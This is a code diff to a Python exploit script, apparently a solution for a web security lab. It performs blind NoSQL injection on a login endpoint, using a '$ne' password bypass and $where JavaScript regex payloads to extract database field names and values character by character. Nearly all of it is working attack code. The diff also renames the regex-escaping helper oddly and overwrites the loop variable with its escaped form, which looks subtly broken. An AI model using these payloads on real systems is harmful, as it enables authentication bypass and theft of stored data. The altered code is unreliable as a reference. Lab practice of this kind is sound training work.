@@ -45,7 +45,7 @@ def make_request(session, url, payload):
         log.error(f"Error during request: {e}")
         return False
 
-def escape_regex_character(character):
+def escape__character(character):
     if character == '\\':
         return '\\\\\\\\'
     elif character in '.^$*+?{}[]|()':
@@ -124,14 +124,14 @@ def get_field_names(session, url, field_lengths_list):
             character_found = None
             
             for character in characters:
-                escaped_character = escape_regex_character(character)
+                character = escape__character(character)
                 
                 payload = {
                     "username": "wiener",
                     "password": {
                         "$ne": None
                     },
-                    "$where": f"function(){{ if (Object.keys(this)[{current_field_index}].match('^.{{{current_position}}}{escaped_character}.*')) return 1; else return 0; }}"
+                    "$where": f"function(){{ if (Object.keys(this)[{current_field_index}].match('^.{{{current_position}}}{character}.*')) return 1; else return 0; }}"
                 }
                 
                 progress_bar.status(payload["$where"])
@@ -215,14 +215,14 @@ def get_field_value_names(session, url, field_names_list, field_value_lengths, f
             character_found = None
             
             for character in characters:
-                escaped_character = escape_regex_character(character)
+                character = escape__character(character)
                 
                 payload = {
                     "username": "wiener",
                     "password": {
                         "$ne": None
                     },
-                    "$where": f"function(){{ if (this.{current_field_name}.valueOf().toString().match('^.{{{current_position}}}{escaped_character}.*')) return 1; else return 0; }}"
+                    "$where": f"function(){{ if (this.{current_field_name}.valueOf().toString().match('^.{{{current_position}}}{character}.*')) return 1; else return 0; }}"
                 }
                 
                 progress_bar.status(payload["$where"])
